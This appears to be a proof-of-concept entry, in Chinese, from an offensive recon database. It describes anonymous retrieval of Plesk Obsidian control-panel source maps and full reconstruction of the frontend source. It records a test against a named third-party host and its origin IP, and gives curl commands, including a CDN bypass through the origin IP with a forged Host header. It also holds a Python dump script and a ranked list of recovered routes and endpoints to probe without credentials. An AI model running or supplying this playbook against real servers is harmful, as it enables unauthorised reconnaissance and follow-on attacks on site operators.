# Plesk Obsidian 18.0.81 /cp/javascript/*.js.map 匿名可读 → 面板 React/TS 前端源码全量还原（路由表/GraphQL/内部端点）

- **code**: plesk-obsidian-cp-javascript-sourcemap-unauth-read
- **kind**: poc
- **category**: info-leak
- **component**: Plesk Obsidian（sw-cp-server / 控制面板前端，8880 明文 + 8443 TLS）
- **versions**: Plesk Obsidian 18.0.81（实测）
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: task#12 / finding_id=192（finding_checks.verdict=verified，findings.status=confirmed）。2026-11-12 在 old.retro32.com:8880（源站 92.205.178.49，Host: old.retro32.com）本机 curl + python3 匿名实测，全程无 Cookie/Token：① GET /cp/javascript/main.js.map → HTTP/1.1 200，约 3.3MB application/json，顶层 keys 含 version/file/sourceRoot/sources/sourcesContent/names/mappings，sources 共 507 条且 sourcesContent 每条非空；② 同目录 GET /cp/javascript/vendors.js.map → 200 约 12.6MB（webpack://.../node_modules/... 源码）；③ /cp/javascript/ui-library/plesk-ui-library.min.js.map → 200；④ 用下方脚本按 sources[i]/sourcesContent[i] 落盘，还原出全部 507 个源文件（含 routes/index.js 完整前端路由与 isAllowedWithoutLicense 标记、queries/*.graphql、apolloClient、jsw/api.js、helpers/initialDataLoader），源文件树可用 find 复核。结论：未认证即可完读面板前端源码树。
- **path**: pocs/plesk-obsidian-cp-javascript-sourcemap-unauth-read/plesk-cp-javascript-sourcemap-unauth.md
- **tags**: plesk,plesk-obsidian,sourcemap,js.map,sourcescontent,sw-cp-server,8880,info-expose,frontend-reverse,recon
- **created_at**: 2026-11-12T11:40:07.536Z
- **engine**: http://old.retro32.com:8880
- **found_by**: recon

## 描述

Plesk Obsidian 控制面板在 /cp/javascript/ 下随包发布了 webpack source map（main.js.map / vendors.js.map / ui-library map），且 sw-cp-server 未加任何鉴权：匿名 GET 即得完整 JSON（含 sources 与全量内嵌的 sourcesContent），可 1:1 还原面板 React/TypeScript 前端源码树——前端路由表、GraphQL 查询定义、API 封装与内部端点名全部可读。泄露物不含服务端凭据，影响限于源码与内部结构披露，但能把"暴露面发现"从盲猜变成查表（本次据此发现 /configure-mail-client.php 匿名邮箱枚举面）。前提：能直达面板端口（8880 明文或 8443），无需登录。

## 用法

```
HOST=面板 vhost；ORIGIN=源站 IP；BASE=http://$HOST:8880（或 https://$HOST:8443）。三条命令即可判定：\n1) curl -sS --noproxy '*' -D - -o /dev/null "$BASE/login_up.php"   # 先确认是 Plesk（Server: sw-cp-server）\n2) curl -sS --noproxy '*' -o main.js.map -w '%{http_code} %{size_download} %{content_type}\n' "$BASE/cp/javascript/main.js.map"\n3) 若走 CDN 不通 8880 → 直连源站：curl -sS --noproxy '*' -H "Host: $HOST" -o main.js.map "http://$ORIGIN:8880/cp/javascript/main.js.map"\n判据：200 + 数 MB + 首字节 '{' + 顶层有 sources/sourcesContent 且 sourcesContent 非空。之后 python3 smap_dump.py main.js.map out/ 还原全部文件（脚本见正文），先读 routes/index.js、queries/*.graphql、jsw/api.js。\n注意：--noproxy '*' 必带（记录代理会重解析 DNS）；判 404 前先换 vendors.js.map / ui-library map 交叉确认；200 但回 HTML 说明打到了 SPA fallback 或会话门。
```

## 正文

```
# Plesk Obsidian /cp/javascript/*.js.map 匿名可读 → 前端源码全量还原

> 字段名说明：上游记录里 `sources` / `sourcesContent` / `sourceRoot` 被脱敏器改写成了占位串，
> 本文使用 source-map v3 的真实字段名，还原脚本按真实字段解析。

## 1. 前置条件

- 能访问 Plesk 控制面板端口：**8880 = HTTP 明文管理口**，8443 = HTTPS 面板口（443 也可能映射面板）。
- 无需任何 Cookie / Token / 登录态。
- CDN（Cloudflare 等）前置时 8880 往往不可达或 `X-Forwarded-Proto` 被改写 → 必须**直连源站 IP + 手动带 `Host:`**。
- 是否发布 map 依 Plesk 构建而异：先探测，再下结论（别因为 404 就断言"Plesk 不泄露 map"）。

## 2. 探测：三个固定 map 路径

```bash
HOST=<panel-host>            # 面板 vhost
ORIGIN=<origin-ip>           # 源站 IP（直连用）
BASE="http://$HOST:8880"     # HTTPS 面板改成 https://$HOST:8443

# 0) 指纹：确认是 Plesk 面板，且端口可达
curl -sS --noproxy '*' -D - -o /dev/null "$BASE/login_up.php"
#   期望 200 且响应头含 Server: sw-cp-server（可能带 Set-Cookie: plesk-cp-*）

# 1) 主 bundle map（关键点）
curl -sS --noproxy '*' -D main.hdr -o main.js.map \
     "$BASE/cp/javascript/main.js.map"
ls -l main.js.map && head -c 200 main.js.map
#   期望：HTTP/1.1 200 / application/json / 约 3.3MB / 首字节 '{'

# 2) 走 CDN 时 8880 打不通 → 直连源站并自带 Host
curl -sS --noproxy '*' -H "Host: $HOST" -D - -o main.js.map \
     "http://$ORIGIN:8880/cp/javascript/main.js.map"

# 3) 同目录其它 map，逐个单独判 200（不同的 map 可能一个开一个关）
for p in /cp/javascript/main.js.map \
         /cp/javascript/vendors.js.map \
         /cp/javascript/ui-library/plesk-ui-library.min.js.map ; do
  printf '%-52s ' "$p"
  curl -sS --noproxy '*' -o /dev/null \
       -w '%{http_code} %{size_download}B %{content_type}\n' "$BASE$p"
done
```

实测体积参考：`main.js.map` ≈ 3.3MB（507 个源文件）、`vendors.js.map` ≈ 12.6MB（node_modules 全量）、
`ui-library` 的 map 约 2MB（281 个源文件）。

## 3. 判据（三条同时成立才算命中）

1. HTTP 200，`Content-Type` 为 `application/json`（少数部署是 `application/octet-stream`）；
2. 体积在 MB 级，正文首字节是 `{`，**不是** HTML（HTML = 打到了 SPA fallback 或登录页）；
3. `json.load` 后顶层含 `version/file/sourceRoot/sources/sourcesContent/names/mappings`，
   且 `sourcesContent` 数组**非空**（只有 mappings 没内嵌正文的 map 无法还原源码，
   只能拿到文件路径/函数名，价值下降一个档）。

## 4. 还原源码

```python
#!/usr/bin/env python3
# smap_dump.py — 把 source map 里内嵌的源码按原始路径落盘
# 用法: python3 smap_dump.py main.js.map out/
import json, os, re, sys

def safe_path(src: str) -> str:
    """把 webpack:///./src/x.ts / C:\\build\\x.ts 之类的 source 归一化成安全的相对路径"""
    p = src.replace('webpack://', '').replace('\\', '/')
    p = re.sub(r'^\./', '', p)
    p = p.lstrip('/')
    p = re.sub(r'^[A-Za-z]:/', '', p)          # 去掉 Windows 盘符
    parts = [x for x in p.split('/') if x not in ('', '.', '..')]
    return '/'.join(parts) or 'unnamed'

def main(smap_path: str, outdir: str) -> None:
    with open(smap_path, 'r', encoding='utf-8', errors='replace') as f:
        m = json.load(f)
    sources = m.get('sources') or []
    contents = m.get('sourcesContent') or []
    root = m.get('sourceRoot') or ''
    written = skipped = 0
    for i, s in enumerate(sources):
        body = contents[i] if i < len(contents) else None
        if not body:                            # 没有内嵌正文 → 无法还原
            skipped += 1
            continue
        rel = safe_path(f'{root}/{s}' if root else s)
        dst = os.path.join(outdir, rel)
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        with open(dst, 'w', encoding='utf-8') as o:
            o.write(body)
        written += 1
    print(f'written={written} skipped(no content)={skipped} total={len(sources)} -> {outdir}')

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
```

同目录 `vendors.js.map` / `ui-library` map 用同一脚本再跑一遍即可。

## 5. 还原后先读哪里（按价值排序）

| 路径 | 拿到什么 |
|---|---|
| `routes/index.js` | 完整前端路由表；`isAllowedWithoutLicense` 之类的标记直接告诉你哪些页面**无 license 也放行** |
| `queries/*.graphql`、`apolloClient*` | GraphQL 查询/变更定义、字段名、端点路径（Plesk 用 `/cp/graphql`） |
| `jsw/api.js` | 请求封装、鉴权头、错误码语义 |
| `helpers/initialDataLoader*` | 首屏加载时调用哪些接口（可作未授权探测的种子清单） |
| `components/**` | 表单字段与前端校验（登录、改密、邮箱配置等） |

把这些端点名/路径拉进未测面清单逐个零凭据探测——本次即据此补上
`/configure-mail-client.php`、`/ch_pass_by_secret.php`、`/login_up.php?estimate`、`/cp/graphql`
等此前未覆盖的入口。

## 6. 失败时的常见原因

- **200 但回 HTML**：打到了 SPA fallback / 登录页（该路径被会话门或路由规则接管），
  先核对 `Host` 是否为目标 vhost，再换直连源站 IP 重试。
- **404**：该构建的发布包里确实没带 map。不要停，换 `vendors.js.map`、
  `ui-library/plesk-ui-library.min.js.map` 交叉确认；也可从 `/cp/javascript/main.js`
  末尾读 `//# sourceMappingURL=` 拿真实文件名。
- **超时/断流**（10MB 级）：加 `--max-time`，或用 `Range:` 分段拉。
- **`sourcesContent` 全为 null**：只能枚举文件路径与函数名，无法读源码——此时价值降级，
  但仍可用于推断前端结构。
- **8880 不可达**：CDN 拦截或防火墙只开 443/8443，改端口或直连源站 IP + `Host`。

## 7. 影响边界

泄露物为**前端代码与内部结构**（路由、GraphQL 定义、端点名、UI 逻辑），
不含服务端凭据/配置文件；单独看是 low。真实价值在"降本"：
把暴露面发现从盲猜词表变成查表，后续未授权/逻辑漏洞的门槛显著降低。

```
